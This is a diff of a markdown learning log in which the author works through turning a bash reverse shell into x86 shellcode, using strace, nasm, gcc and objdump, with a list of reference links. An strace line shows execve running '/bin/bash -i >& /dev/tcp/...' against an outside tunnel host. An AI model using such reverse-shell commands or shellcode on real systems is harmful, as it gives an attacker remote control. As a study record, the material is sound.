@@ -61,8 +61,12 @@ And it worked - reverse shell!
 
 
 
-### Getting to assembly from C
+## Getting to assembly from C
 
+This is the part I feared the most. I've zero experience with asm, the alternative syntax, debugging.
+If this part goes wrong...
+
+### Attempt 1 (a shortcut?)
 Now I need to convert this to asm, so as per [2] I used `strace`;
 
 ```
@@ -75,7 +79,7 @@ execve("/bin/bash", ["/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/0.tcp.e"...], 
 ```
 I can't see this working for me just yet...
 
-
+### Attempt 2
 Looking back at the original tutorial and code [4], I'm thinking I could do the same with my custom line, and just call execve.
 
 Now I attempt to compile with the nasm utility;
@@ -83,21 +87,26 @@ Now I attempt to compile with the nasm utility;
 ```
 nasm -felf32 -o ./bin/shell-code.o ./shell-code.asm
 ```
-Unfortunately this didn't run, there must be errors...
+Unfortunately this didn't run, there must be errors... I now work towards turning this in to a "hello world" example.
+
+### Attempt 3
+Followed a SO, so going to try this... 
+```
+gcc -S input.c -o output.asm -masm=intel
+```
+Nope, did not work for me - [5] there are fundamental differences between NASM and TASM [6].
+
+
+## Getting to Opcode from assembly
 
 I'm using zsh so the original example threw me out a little, I made a quick fix...
 ```
 for i in $(objdump -d ./bin/shell-code.o -M intel |grep "^ " |cut -f2); do echo -n '\\x'$i; done; echo
 ```
 
-Followed a SO, so going to try this... 
-```
-gcc -S input.c -o output.asm -masm=intel
-```
-Nope, did not work for me - [5] there are fundamental differences between NASM and TASM.
+## Placing the Opcode in to a runner 
 
-
-
+Lorem ipsum...
 
 
 [1] https://stackoverflow.com/questions/44914538/execute-reverse-shell-using-execve
@@ -110,7 +119,7 @@ Nope, did not work for me - [5] there are fundamental differences between NASM a
 
 [5] https://stackoverflow.com/questions/8406188/does-gcc-really-know-how-to-output-nasm-assembly
 
-
+[6] https://stackoverflow.com/questions/137038/how-do-you-get-assembler-output-from-c-c-source-in-gcc
 
 
 ## Other
@@ -147,6 +156,8 @@ https://pentesterslife.blog/2017/11/01/x86_64-tcp-bind-shellcode-with-basic-auth
 
 ### Dealing with bash -c
 https://stackoverflow.com/questions/14141007/c-executing-bash-commands-with-execvp
+https://stackoverflow.com/questions/36022331/bash-i-dev-tcp-127-0-0-1-1234-01
+https://stackoverflow.com/questions/16091382/pass-arguments-to-execve-program-in-shellcode
 
 ### Reversing shellcode to assembly
 https://xorl.wordpress.com/2009/01/04/from-shellcode-to-assembly/
@@ -155,4 +166,10 @@ https://haiderm.com/convert-hex-assembly-using-simple-python-script/
 
 ### Tools
 https://github.com/reyammer/shellnoob
+
+### Other / miscellaneous
+
+https://pentesterslife.blog/2017/11/01/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/
+https://brennan.io/2015/01/16/write-a-shell-in-c/
+
 
